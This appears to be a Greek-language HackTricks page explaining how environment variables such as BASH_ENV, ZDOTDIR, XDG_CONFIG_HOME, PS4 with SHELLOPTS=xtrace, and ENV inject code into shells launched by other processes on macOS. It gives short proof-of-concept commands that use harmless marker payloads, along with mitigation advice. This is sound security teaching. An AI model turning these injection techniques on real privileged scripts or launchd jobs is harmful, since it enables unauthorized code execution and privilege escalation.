# macOS Έγχυση σε Shell Applications

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

Όταν το Bash ξεκινά μη διαδραστικά για να εκτελέσει ένα script ή μια εντολή `-c`, επεκτείνει την τιμή του `BASH_ENV` και κάνει source το αρχείο που προκύπτει πριν εκτελέσει την ζητούμενη εντολή. Το Bash δεν χρησιμοποιεί το `PATH` για να βρει αυτό το αρχείο. Επομένως, μια διεργασία που εκκινεί μη διαδραστικό Bash με environment variables ελεγχόμενες από τον attacker μπορεί να εξαναγκαστεί να εκτελέσει πρώτα ένα αναγνώσιμο shell payload.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
Το hook εκτελείται μόνο όταν ο στόχος ξεκινά πραγματικά το Bash· το `/bin/sh` σε άλλη πλατφόρμα ή ένα πρόγραμμα που εκτελεί μια εντολή χωρίς shell δεν θα το τηρεί απαραίτητα. Το Bash σε privileged mode αγνοεί το `BASH_ENV`. Όταν τα effective και real user/group IDs διαφέρουν, το Bash παραλείπει επίσης τα startup files και επαναφέρει τα effective IDs, εκτός αν δοθεί το `-p`· με το `-p`, το privileged mode παραμένει ενεργό και το `BASH_ENV` εξακολουθεί να αγνοείται.<sup>[[1]](#references)[[2]](#references)</sup>

Στο macOS, τα `launchd` jobs μπορούν να ορίζουν inherited ή per-job environment variables, επομένως ελέγξτε τα plists και τα launch contexts που τροφοδοτούν privileged scripts. Μην βασίζεστε μόνο στο SIP για την απολύμανση των interpreter variables: χρησιμοποιήστε ένα minimal environment (`env -i`), κάντε explicit unset στο `BASH_ENV`, καλέστε τον intended interpreter μέσω absolute path και αποφύγετε writable startup files.

## zsh `ZDOTDIR`

Το zsh διαβάζει το `$ZDOTDIR/.zshenv` για κάθε normal shell, συμπεριλαμβανομένων των non-interactive shells· αν το `ZDOTDIR` δεν έχει οριστεί, χρησιμοποιεί το `HOME`. Επομένως, η ανακατεύθυνση του `ZDOTDIR` σε έναν writable κατάλογο εκτελεί το `.zshenv` του πριν από μια εντολή ή ένα script `zsh -c`.<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f` καταργεί την επιλογή `RCS` και παρακάμπτει αυτό το αρχείο εκκίνησης του χρήστη. Το καθολικό `/etc/zshenv` εξακολουθεί να διαβάζεται, επομένως πρέπει να παραμένει αξιόπιστο και minimal.

## fish `XDG_CONFIG_HOME`

Το fish διαβάζει τα `$XDG_CONFIG_HOME/fish/conf.d/*.fish` και `$XDG_CONFIG_HOME/fish/config.fish` κατά την εκκίνηση κάθε shell, όχι μόνο των interactive ή login shells. Εκτελεί επίσης τα `fish/vendor_conf.d/*.fish` κάτω από τις καταχωρίσεις στο `XDG_DATA_DIRS`. Ένας attacker που ελέγχει μία από αυτές τις μεταβλητές και έναν αναγνώσιμο κατάλογο μπορεί επομένως να εκτελέσει code πριν από ένα fish script ή μια εντολή `-c`.<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
Χρησιμοποίησε το `fish --no-config` για μια αξιόπιστη κλήση και εκκαθάρισε τις μη αξιόπιστες μεταβλητές διαδρομής XDG.

## bash `PS4` + xtrace (`SHELLOPTS`)

Όταν το Bash εκτελείται με ενεργοποιημένη την επιλογή **xtrace**, πριν από κάθε καταγεγραμμένη εντολή επεκτείνει το `PS4` και το εκτυπώνει. Το `PS4` επεκτείνεται όπως οποιοδήποτε prompt, επομένως εκτελείται μια **command substitution** που περιέχεται σε αυτό. Τόσο η τιμή του `PS4` **όσο και ο τρόπος ενεργοποίησης του xtrace** μπορούν να προέρχονται αποκλειστικά από το environment: η εξαγωγή του `SHELLOPTS=xtrace` ενεργοποιεί το xtrace για ένα κανονικό `bash script.sh` (χωρίς να απαιτείται η σημαία `-x`). Αυτό μετατρέπει οποιοδήποτε Bash script εκτελεί το θύμα σε εκτέλεση κώδικα.<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` από μόνο του δεν κάνει τίποτα μέχρι να ενεργοποιηθεί το xtrace (μέσω των `SHELLOPTS=xtrace`, `set -x` ή `bash -x`). Το Bash αγνοεί το `SHELLOPTS` σε **privileged mode** (διαφορετικά real/effective IDs χωρίς χειρισμό του `-p`), επομένως ισχύουν οι ίδιες επισημάνσεις για setuid όπως και στο `BASH_ENV`.

## POSIX `ENV`

Τα shells τύπου POSIX (`/bin/sh`, `dash`, `ksh`) διαβάζουν τη μεταβλητή `ENV`, την κάνουν expand και κάνουν source το αρχείο που προκύπτει όταν ξεκινούν ένα **interactive** shell. Είναι το POSIX αντίστοιχο του `BASH_ENV` (το οποίο ενεργοποιείται για *non-interactive* Bash), επομένως ο έλεγχος του `ENV` εκτελεί κώδικα κάθε φορά που ένα victim δημιουργεί ένα interactive `sh`/`dash`.
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Αρχεία εκκίνησης Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Κλήση του Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [Αρχεία εκκίνησης/τερματισμού zsh](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [Αρχεία ρυθμίσεων fish](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Μεταβλητές Bash — `PS4` και το ενσωματωμένο Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
